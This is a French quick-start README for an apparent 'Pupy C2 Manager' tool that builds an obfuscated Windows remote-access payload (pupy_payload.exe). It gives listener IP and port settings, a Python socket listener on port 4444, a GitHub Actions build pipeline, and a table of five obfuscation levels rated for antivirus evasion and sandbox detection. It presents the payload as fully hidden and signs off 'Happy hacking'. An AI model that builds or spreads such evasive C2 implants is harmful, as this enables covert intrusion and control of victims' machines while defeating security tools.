# ⚡ DÉMARRAGE RAPIDE - Pupy C2 Manager v3.0

## 🚀 En 3 minutes

### **1. Lancez l'application**
```bash
cd /Users/kalilbelgoumri/Desktop/pupy-c2-manager-macos
/Users/kalilbelgoumri/Desktop/pupy_env/bin/python src/main.py
```

### **2. Allez à l'onglet "Bundler"**

Remplissez:
- **Listener IP**: `192.168.1.40`
- **Listener Port**: `4444`
- **Obfuscation**: `Level 2 - XOR` (⭐ Recommandé)
- **Platform**: `Windows (.exe)`

### **3. Cliquez "🔨 Start Bundling"**

⏳ Attendez 30-60 secondes...

✅ Votre `pupy_payload.exe` est prêt dans `dist/`

---

## 📥 Récupérer l'exe sur GitHub Actions

### **Option A: Compilation Locale (Rapide)**
```bash
# L'exe est direct dans dist/pupy_payload.exe
ls -lah dist/
```

### **Option B: GitHub Actions (Production)**

1. Modifiez `payload.py`:
```bash
echo "# Updated" >> payload.py
git add payload.py
git commit -m "New build"
git push
```

2. GitHub Actions compile automatiquement:
```
https://github.com/kalilBelgoumri/pupy-c2-manager-macos/actions
```

3. Après 2-3 min, téléchargez `payload-windows-pe`

---

## 🧪 Tester sur Windows VM

### **Étape 1: Copier l'exe**
```
Depuis macOS → Vers Windows VM
dist/pupy_payload.exe
```

### **Étape 2: Lancer le listener (macOS)**
```python
# Optionnel: créer un listener Pupy simple
import socket
listener = socket.socket()
listener.bind(('0.0.0.0', 4444))
listener.listen(1)
print("[+] Listener en attente...")
conn, addr = listener.accept()
print(f"[+] Connecté de {addr}")
```

### **Étape 3: Exécuter sur Windows**
```
C:\> pupy_payload.exe
```

✅ Pupy se lance (obfusqué, caché, fonctionnel!)

---

## 🔐 Les 5 Niveaux d'Obfuscation

| Niveau | Anti-AV | Délai | Sandbox Check | Cas d'Usage |
|--------|---------|-------|---------------|-----------|
| 1 | ⭐ | Aucun | Non | Tests |
| 2 | ⭐⭐⭐ | 1-3s | Non | **Recommandé** |
| 3 | ⭐⭐⭐⭐ | 5-15s | Oui | VM dangereuses |
| 4 | ⭐⭐⭐⭐⭐ | 5-15s | Oui | Détection statique |
| 5 | ⭐⭐⭐⭐⭐⭐⭐ | 60-300s | Extrême | **MAXIMUM** |

---

## 📁 Structure du Projet

```
pupy-c2-manager-macos/
├── src/
│   ├── main.py                      # Application GUI
│   ├── bundler_tab.py               # Interface Bundler
│   ├── pupy_bundler.py              # Bundler Pupy (NEW)
│   ├── pupy_obfuscated_payload.py   # Obfuscateur (NEW)
│   └── [autres tabs...]
├── dist/
│   └── pupy_payload.exe             # Executable compilé
├── .github/workflows/
│   └── build-windows-pe.yml         # GitHub Actions
├── payload.py                        # Trigger pour GitHub
└── PUPY_BUNDLER_V3_COMPLETE.md     # Documentation complète
```

---

## 🎯 Workflow Typique

```
1. Modifiez settings dans l'app
           ↓
2. Cliquez "Start Bundling"
           ↓
3. dist/pupy_payload.exe créé
           ↓
4. Testez sur Windows VM
           ↓
5. ✅ Pupy fonctionne!
```

---

## 🔧 Dépannage

**Erreur: "Bundler not found"**
```bash
# Vérifiez que les fichiers existent
ls src/pupy_*.py
```

**Erreur: "Import error"**
```bash
# Réinstallez PyInstaller
pip install --upgrade pyinstaller
```

**GitHub Actions fail**
```
Vérifiez: https://github.com/.../actions
Cherchez le message d'erreur dans les logs
```

---

## 📞 Support Rapide

**Pour générer un exe local:**
```bash
python src/main.py
# UI → Bundler → Start Bundling
```

**Pour générer via GitHub:**
```bash
git push payload.py
# Attendez 2-3 min
# Récupérez l'artifact
```

**Pour tester l'obfuscation:**
```bash
# Testez les 5 niveaux avec une VM
# Niveau 5 = pratiquement impossible à analyser
```

---

## 🚀 C'est Prêt!

Votre **Pupy C2 Manager complet** avec:
- ✅ Application GUI complète
- ✅ 5 niveaux d'obfuscation anti-AV
- ✅ Compilation GitHub Actions
- ✅ Pupy complètement caché

**Commencez:**
```bash
python src/main.py
```

Happy hacking! 🎯

